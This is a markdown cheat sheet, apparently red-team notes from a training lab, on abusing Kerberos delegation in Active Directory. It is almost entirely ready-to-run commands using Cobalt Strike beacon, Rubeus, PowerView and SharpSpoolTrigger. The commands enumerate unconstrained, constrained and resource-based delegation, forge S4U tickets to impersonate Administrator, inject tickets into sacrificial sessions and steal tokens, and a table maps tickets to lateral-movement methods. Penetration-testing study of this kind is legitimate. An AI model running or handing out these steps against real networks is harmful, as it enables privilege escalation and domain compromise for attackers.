# Discovery

## Unconstrained Delegation

```shell
# Find unconstrained delegation
beacon> ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samaccountname

# Use rubeus for monitoring
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /nowrap

# Kill rubeus once done
beacon> jobs
beacon> jobkill $NUMBER

# Inject in sacrificial login
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:dyork /password:FakePass /ticket:[TICKET]

# Now steal token from the session
beacon> steal_token $PID
beacon> run klist

# Cleanup
beacon> rev2self
beacon> kill $PID
```

## Constrained Delegation

```shell
# Finding constrained delegation
beacon> ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo

beacon> ldapsearch (&(samAccountType=805306369)(samaccountname=lon-ws-1$)) --attributes userAccountControl


# Attacking S4U
# With Protocol transition
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGf[...snip...]ZzLTE=

# Without Protocol transition
# /ticket is the TGT for the principal.
# /tgs is a captured front-end service ticket for a user.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:cifs/lon-fs-1 /ticket:doIFn[...snip...]5DT00= /tgs:doIFp[...snip...]dzLTE= /nowrap

# Service name substitution
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1 /altservice:cifs /ticket:doIFn[...snip...]5DT00= /impersonateuser:Administrator /nowrap

# S4U2Self computer takeover
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:cifs/lon-dc-1 /ticket:doIFt[...snip...]5DT00= /nowrap
```

## Resource Based Constrained Delegation

```shell
#  Import powerview
ipmo C:\Tools\PowerSploit\Recon\PowerView.ps1

# Get credentials of user to use with commands 
$Cred = Get-Credential $DOMAIN\$USER

# Find RBCD
Get-DomainComputer -Server $DC_IP -Credential $Cred | Get-DomainObjectAcl -Server $DC_IP -Credential $Cred | ? { $_.ObjectAceType -eq '3f78c3e5-f79a-46bd-a0b8-9d18116ddc79' -and $_.ActiveDirectoryRights -Match 'WriteProperty|GenericWrite|GenericAll' } | 
select ObjectDN,SecurityIdentifier,ActiveDirectoryRights
```

> All delegations, whether it be unconstrained, constrained, or resource-based, can only be configured on accounts that have an SPN.
- Other computer accounts can be used if you have elevated privileges to SYSTEM anywhere, as every computer has a default set of SPNs such as HOST, RestrictedKrbHost, TERMSRV, and WSMAN.
- Service accounts can be used if you have obtained their credentials through an attack such as kerberoasting.
- If you don't have any of the above, a last ditch attempt can be to add your own computer object to the domain. Tools such as StandIn can create these fake computer objects via LDAP.

```shell
# Finding computers with PrincipalsAllowedToDelegateToAccount
Get-ADComputer -Filter * -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

# Add a computer you have SYSTEM on
$ws1 = Get-ADComputer -Identity 'lon-ws-1' -Server 10.10.120.1 -Credential $Cred
$wkstn1 = Get-ADComputer -Identity 'lon-wkstn-1' -Server 10.10.120.1 -Credential $Cred

# Set RBCD
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1,$wkstn1 -Server 10.10.120.1 -Credential $Cred
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

# Extract ticket
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount

# Perform delegation attack
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /impersonateuser:Administrator /msdsspn:cifs/lon-fs-1 /ticket:doIFr[...snip...]kNPTQ== /nowrap

# Inject the ticket in session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:doIGh[...snip...]nMtMQ==

# Steal token of the process
steal_token $PID
```

```shell
# Cleanup
Set-ADComputer -Identity 'lon-fs-1' -PrincipalsAllowedToDelegateToAccount $ws1 -Server 10.10.120.1 -Credential $Cred
Get-ADComputer -Identity 'lon-fs-1' -Properties PrincipalsAllowedToDelegateToAccount -Server 10.10.120.1 -Credential $Cred | select Name,PrincipalsAllowedToDelegateToAccount
```

| Name              | Description                                                     | Ticket(s)        |
|-------------------|-----------------------------------------------------------------|-------------------|
| SMB               | Access the remote filesystem. View, list, upload, & delete files. | CIFS              |
| PsExec            | Run a binary via the Service Control Manager.                   | CIFS              |
| WinRM             | Windows Remote Management.                                      | HTTP              |
| WMI               | Execute applications on the remote target (e.g., process call create). | RPCSS, HOST, RestrictedKrbHost       |
| RDP               | Remote Desktop Protocol.                                        | TERMSRV, HOST     |
| MSSQL             | MS SQL Databases.                                               | MSSQLSvc          |
